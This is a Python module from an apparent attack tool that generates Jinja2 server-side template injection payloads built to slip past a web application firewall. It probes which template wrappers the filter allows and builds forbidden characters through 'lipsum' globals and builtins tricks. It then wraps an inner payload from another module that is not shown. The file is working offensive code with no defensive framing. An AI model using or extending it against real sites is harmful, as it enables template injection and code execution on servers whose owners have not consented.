from typing import Callable, List, Tuple
import logging

from . import payload_gen
from .int_vars import get_useable_int_vars
from .colorize import colored

logger = logging.getLogger("shell_payload")


def get_int_context(waf_func):
    ints, var_names, payload = get_useable_int_vars(waf_func)
    if len(ints) == 0:
        logger.warning("No IntVars For YOU!")
    return payload, dict(zip(var_names, ints))


def get_str_context(waf_func):
    str_vars = [
        ("un", "_", "{%set un=(lipsum|escape|batch(22)|list|first|last)%}"),
        ("perc", "%", "{%set perc=(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
         "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
         "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}")
    ]
    str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
    return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}


def get_outer_pattern(waf_func):
    outer_payloads = [
        ("{{}}", "{{PAYLOAD}}", True),
        ("{%print()%}", "{%print(PAYLOAD)%}", True),
        ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
    ]
    for test_payload, outer_pattern, will_print in outer_payloads:
        if waf_func(test_payload):
            return outer_pattern, will_print
    else:
        logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
        return None, None


class FullPayloadGen:
    def __init__(self, waf_func):
        self.waf_func = waf_func
        self.prepared = False

    def do_prepare(self) -> bool:

        if self.prepared:
            return True

        int_payload, int_context = get_int_context(self.waf_func)
        str_payload, str_context = get_str_context(self.waf_func)

        self.context_payload, self.context = int_payload + \
            str_payload, {**int_context, **str_context}
        self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
        if not self.outer_pattern:
            return False
        if self.will_print:
            logger.info(f"use {colored('blue', self.outer_pattern)}")
        else:
            logger.warning(
                f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")
        self.prepared = True
        return True

    def generate(self, gen_type, *args) -> Tuple[str | None, bool | None]:

        if not self.prepared and not self.do_prepare():
            return None, None

        inner_payload = payload_gen.generate(
            gen_type,
            *args,
            waf_func=self.waf_func,
            context=self.context
        )

        if inner_payload is None:
            logger.warning("Bypassing WAF Failed.")
            return None, None

        assert isinstance(self.outer_pattern, str)

        return (
            self.context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload), 
            self.will_print
        )

